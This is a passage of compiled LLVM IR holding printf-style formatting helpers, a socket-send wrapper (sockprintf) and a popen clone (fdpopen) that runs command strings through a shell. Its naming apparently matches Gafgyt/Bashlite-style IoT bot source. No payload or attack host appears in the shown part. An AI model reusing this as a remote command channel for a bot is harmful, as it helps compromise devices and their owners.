  %34 = ashr exact i64 %sext34, 32
  %35 = getelementptr inbounds i8, i8* %0, i64 %34
  store i8 0, i8* %35, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %9 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %10 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %11 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %12 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %13 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %14 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %15 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %16 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %17 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %18 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %19 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %20 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %21 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %22 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %23 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  %24 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  br label %25

; <label>:25:                                     ; preds = %153, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %153 ]
  %.0 = phi i8* [ %1, %3 ], [ %154, %153 ]
  %26 = load i8, i8* %.0, align 1
  switch i8 %26, label %149 [
    i8 0, label %155
    i8 37, label %27
  ]

; <label>:27:                                     ; preds = %25
  %28 = getelementptr inbounds i8, i8* %.0, i64 1
  %29 = load i8, i8* %28, align 1
  switch i8 %29, label %.preheader70 [
    i8 0, label %155
    i8 37, label %149
    i8 45, label %30
  ]

; <label>:30:                                     ; preds = %27
  %31 = getelementptr inbounds i8, i8* %.0, i64 2
  br label %.preheader70

.preheader70:                                     ; preds = %30, %27
  %.063.ph = phi i32 [ 0, %27 ], [ 1, %30 ]
  %.1.ph = phi i8* [ %28, %27 ], [ %31, %30 ]
  %32 = load i8, i8* %.1.ph, align 1
  %33 = icmp eq i8 %32, 48
  br i1 %33, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %37, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %36, %.preheader.loopexit ]
  %34 = load i8, i8* %.1.lcssa, align 1
  %.off74 = add i8 %34, -48
  %35 = icmp ult i8 %.off74, 10
  br i1 %35, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %36, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %37, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %36 = getelementptr inbounds i8, i8* %.172, i64 1
  %37 = or i32 %.06371, 2
  %38 = load i8, i8* %36, align 1
  %39 = icmp eq i8 %38, 48
  br i1 %39, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %40 = phi i8 [ %46, %.lr.ph77 ], [ %34, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %45, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %44, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %41 = zext i8 %40 to i32
  %42 = mul nsw i32 %.06475, 10
  %43 = add i32 %42, -48
  %44 = add i32 %43, %41
  %45 = getelementptr inbounds i8, i8* %.276, i64 1
  %46 = load i8, i8* %45, align 1
  %.off = add i8 %46, -48
  %47 = icmp ult i8 %.off, 10
  br i1 %47, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %44, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %45, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %34, %.preheader ], [ %46, %.critedge.loopexit ]
  switch i8 %.lcssa, label %153 [
    i8 115, label %48
    i8 100, label %68
    i8 120, label %84
    i8 88, label %100
    i8 117, label %116
    i8 99, label %132
  ]

; <label>:48:                                     ; preds = %.critedge
  %49 = load i32, i32* %5, align 8
  %50 = icmp ult i32 %49, 41
  br i1 %50, label %51, label %56

; <label>:51:                                     ; preds = %48
  %52 = load i8*, i8** %6, align 8
  %53 = sext i32 %49 to i64
  %54 = getelementptr i8, i8* %52, i64 %53
  %55 = add i32 %49, 8
  store i32 %55, i32* %5, align 8
  br label %59

; <label>:56:                                     ; preds = %48
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr i8, i8* %57, i64 8
  store i8* %58, i8** %7, align 8
  br label %59

; <label>:59:                                     ; preds = %56, %51
  %.in69 = phi i8* [ %54, %51 ], [ %57, %56 ]
  %60 = bitcast i8* %.in69 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = sext i32 %61 to i64
  %63 = inttoptr i64 %62 to i8*
  %64 = icmp ne i32 %61, 0
  %65 = select i1 %64, i8* %63, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.127, i64 0, i64 0)
  %66 = tail call fastcc i32 @prints(i8** %0, i8* %65, i32 %.064.lcssa, i32 %.063.lcssa)
  %67 = add nsw i32 %66, %.061
  br label %153

; <label>:68:                                     ; preds = %.critedge
  %69 = load i32, i32* %8, align 8
  %70 = icmp ult i32 %69, 41
  br i1 %70, label %71, label %76

; <label>:71:                                     ; preds = %68
  %72 = load i8*, i8** %9, align 8
  %73 = sext i32 %69 to i64
  %74 = getelementptr i8, i8* %72, i64 %73
  %75 = add i32 %69, 8
  store i32 %75, i32* %8, align 8
  br label %79

; <label>:76:                                     ; preds = %68
  %77 = load i8*, i8** %10, align 8
  %78 = getelementptr i8, i8* %77, i64 8
  store i8* %78, i8** %10, align 8
  br label %79

; <label>:79:                                     ; preds = %76, %71
  %.in68 = phi i8* [ %74, %71 ], [ %77, %76 ]
  %80 = bitcast i8* %.in68 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = tail call fastcc i32 @printi(i8** %0, i32 %81, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %83 = add nsw i32 %82, %.061
  br label %153

; <label>:84:                                     ; preds = %.critedge
  %85 = load i32, i32* %11, align 8
  %86 = icmp ult i32 %85, 41
  br i1 %86, label %87, label %92

; <label>:87:                                     ; preds = %84
  %88 = load i8*, i8** %12, align 8
  %89 = sext i32 %85 to i64
  %90 = getelementptr i8, i8* %88, i64 %89
  %91 = add i32 %85, 8
  store i32 %91, i32* %11, align 8
  br label %95

; <label>:92:                                     ; preds = %84
  %93 = load i8*, i8** %13, align 8
  %94 = getelementptr i8, i8* %93, i64 8
  store i8* %94, i8** %13, align 8
  br label %95

; <label>:95:                                     ; preds = %92, %87
  %.in67 = phi i8* [ %90, %87 ], [ %93, %92 ]
  %96 = bitcast i8* %.in67 to i32*
  %97 = load i32, i32* %96, align 4
  %98 = tail call fastcc i32 @printi(i8** %0, i32 %97, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %99 = add nsw i32 %98, %.061
  br label %153

; <label>:100:                                    ; preds = %.critedge
  %101 = load i32, i32* %14, align 8
  %102 = icmp ult i32 %101, 41
  br i1 %102, label %103, label %108

; <label>:103:                                    ; preds = %100
  %104 = load i8*, i8** %15, align 8
  %105 = sext i32 %101 to i64
  %106 = getelementptr i8, i8* %104, i64 %105
  %107 = add i32 %101, 8
  store i32 %107, i32* %14, align 8
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i8*, i8** %16, align 8
  %110 = getelementptr i8, i8* %109, i64 8
  store i8* %110, i8** %16, align 8
  br label %111

; <label>:111:                                    ; preds = %108, %103
  %.in66 = phi i8* [ %106, %103 ], [ %109, %108 ]
  %112 = bitcast i8* %.in66 to i32*
  %113 = load i32, i32* %112, align 4
  %114 = tail call fastcc i32 @printi(i8** %0, i32 %113, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %115 = add nsw i32 %114, %.061
  br label %153

; <label>:116:                                    ; preds = %.critedge
  %117 = load i32, i32* %17, align 8
  %118 = icmp ult i32 %117, 41
  br i1 %118, label %119, label %124

; <label>:119:                                    ; preds = %116
  %120 = load i8*, i8** %18, align 8
  %121 = sext i32 %117 to i64
  %122 = getelementptr i8, i8* %120, i64 %121
  %123 = add i32 %117, 8
  store i32 %123, i32* %17, align 8
  br label %127

; <label>:124:                                    ; preds = %116
  %125 = load i8*, i8** %19, align 8
  %126 = getelementptr i8, i8* %125, i64 8
  store i8* %126, i8** %19, align 8
  br label %127

; <label>:127:                                    ; preds = %124, %119
  %.in65 = phi i8* [ %122, %119 ], [ %125, %124 ]
  %128 = bitcast i8* %.in65 to i32*
  %129 = load i32, i32* %128, align 4
  %130 = tail call fastcc i32 @printi(i8** %0, i32 %129, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %131 = add nsw i32 %130, %.061
  br label %153

; <label>:132:                                    ; preds = %.critedge
  %133 = load i32, i32* %20, align 8
  %134 = icmp ult i32 %133, 41
  br i1 %134, label %135, label %140

; <label>:135:                                    ; preds = %132
  %136 = load i8*, i8** %21, align 8
  %137 = sext i32 %133 to i64
  %138 = getelementptr i8, i8* %136, i64 %137
  %139 = add i32 %133, 8
  store i32 %139, i32* %20, align 8
  br label %143

; <label>:140:                                    ; preds = %132
  %141 = load i8*, i8** %24, align 8
  %142 = getelementptr i8, i8* %141, i64 8
  store i8* %142, i8** %24, align 8
  br label %143

; <label>:143:                                    ; preds = %140, %135
  %.in = phi i8* [ %138, %135 ], [ %141, %140 ]
  %144 = bitcast i8* %.in to i32*
  %145 = load i32, i32* %144, align 4
  %146 = trunc i32 %145 to i8
  store i8 %146, i8* %22, align 1
  store i8 0, i8* %23, align 1
  %147 = call fastcc i32 @prints(i8** %0, i8* nonnull %22, i32 %.064.lcssa, i32 %.063.lcssa)
  %148 = add nsw i32 %147, %.061
  br label %153

; <label>:149:                                    ; preds = %27, %25
  %.3 = phi i8* [ %.0, %25 ], [ %28, %27 ]
  %150 = load i8, i8* %.3, align 1
  %151 = zext i8 %150 to i32
  tail call fastcc void @printchar(i8** %0, i32 %151)
  %152 = add nsw i32 %.061, 1
  br label %153

; <label>:153:                                    ; preds = %.critedge, %149, %143, %127, %111, %95, %79, %59
  %.162 = phi i32 [ %152, %149 ], [ %67, %59 ], [ %83, %79 ], [ %99, %95 ], [ %115, %111 ], [ %131, %127 ], [ %148, %143 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %149 ], [ %.2.lcssa, %59 ], [ %.2.lcssa, %79 ], [ %.2.lcssa, %95 ], [ %.2.lcssa, %111 ], [ %.2.lcssa, %127 ], [ %.2.lcssa, %143 ], [ %.2.lcssa, %.critedge ]
  %154 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %25

; <label>:155:                                    ; preds = %27, %25
  %156 = icmp eq i8** %0, null
  br i1 %156, label %159, label %157

; <label>:157:                                    ; preds = %155
  %158 = load i8*, i8** %0, align 8
  store i8 0, i8* %158, align 1
  br label %159

; <label>:159:                                    ; preds = %155, %157
  %160 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %160)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #3
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #3
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #15
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.38, i64 0, i64 0), i8* %5)
  %12 = call i64 @strlen(i8* %5) #15
  %13 = call i64 @send(i32 %0, i8* %5, i64 %12, i32 16384) #3
  %14 = trunc i64 %13 to i32
  call void @free(i8* %5) #3
  ret i32 %14
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %78 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %78

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #3
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %78, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #3
  %18 = icmp slt i32 %17, 1
  br i1 %18, label %78, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #3
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %78, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #16
  switch i32 %27, label %61 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #3
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #3
  br label %78

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #3
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #3
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #3
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #3
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #3
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #3
  br label %59

; <label>:59:                                     ; preds = %55, %45
  %60 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.39, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.40, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.41, i64 0, i64 0), i8* %0, i8* null) #3
  call void @_exit(i32 127) #17
  unreachable

; <label>:61:                                     ; preds = %26
  %62 = load i8, i8* %1, align 1
  %63 = icmp eq i8 %62, 114
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %10, align 4
  %66 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @close(i32 %67) #3
  br label %74

; <label>:69:                                     ; preds = %61
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = load i32, i32* %10, align 4
  %73 = call i32 @close(i32 %72) #3
  br label %74

; <label>:74:                                     ; preds = %69, %64
  %.011 = phi i32 [ %65, %64 ], [ %71, %69 ]
  %75 = load i32*, i32** @fdopen_pids, align 8
  %76 = sext i32 %.011 to i64
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  store i32 %27, i32* %77, align 4
  br label %78

; <label>:78:                                     ; preds = %19, %16, %9, %5, %2, %74, %28
  %.0 = phi i32 [ %.011, %74 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
